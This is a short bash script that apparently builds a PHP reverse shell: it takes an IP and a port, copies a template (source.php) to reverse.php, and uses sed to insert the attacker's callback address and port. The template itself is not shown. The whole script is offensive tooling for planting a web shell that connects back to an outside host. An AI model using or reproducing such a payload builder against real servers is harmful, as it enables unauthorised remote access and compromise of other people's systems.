#!/bin/bash
if [ -z "$1" ]
  then
    echo "Please specify IP"
    exit
fi
if [ -z "$2" ]
  then
    echo "Please specify Port"
    exit
fi
rm reverse.php
cp source.php reverse.php
sed -i'' -e 's/{ip}/'"$1"'/g' reverse.php
sed -i'' -e 's/{port}/'"$2"'/g' reverse.php

